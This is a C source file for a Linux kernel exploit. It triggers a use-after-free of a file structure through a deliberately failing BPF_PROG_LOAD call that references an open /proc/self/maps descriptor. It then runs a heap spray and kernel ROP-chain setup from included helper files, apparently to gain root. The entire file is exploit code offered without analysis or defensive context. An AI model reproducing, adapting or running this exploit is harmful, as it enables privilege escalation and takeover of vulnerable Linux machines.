#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>
#include "log1_be901056a6e2e98482dfa2434f8e74405fcd371d_log0_0.prog.c"
#include "heapspray_addkey.c"
#include "rop_payload.c"
#include "userspace_base_mmap.c"

#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int do_nothing(void *p) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  while (1){
	  sleep(1);
  }
}

int main(void) {
	char buf[4096];

	char child_stack[8000];
	int child = clone(do_nothing, child_stack + sizeof(child_stack), CLONE_FILES, NULL);
	if (child == -1)
		err(1, "clone");

	int uaf_fd = open("/proc/self/maps", O_RDONLY);
	if (uaf_fd == -1)
		err(1, "unable to open UAF fd");

	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{
		}
	};
	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1){
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	}
	if (errno != EINVAL){
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
	}

	sleep(1);

    save_state();
    spray_buffer_init();
    init_userspace_base();
    prepare_krop();
    kmalloc(1024);

    loop(uaf_fd);
    
	/*
	while (1) {
		sleep(1);
		// at this point, the struct file of uaf_fd should be freed 
		ssize_t res = read(uaf_fd, buf, 4096);
		if (res == -1){
			err(1, "unable to read from uaf_fd post-UAF");
		}
		if (res == 0){
			errx(1, "unable to read from uaf_fd post-UAF (EOF)");
		}
		write(1, buf, res);
		lseek(uaf_fd, 0, SEEK_SET);
	}
	*/
    pause();
}
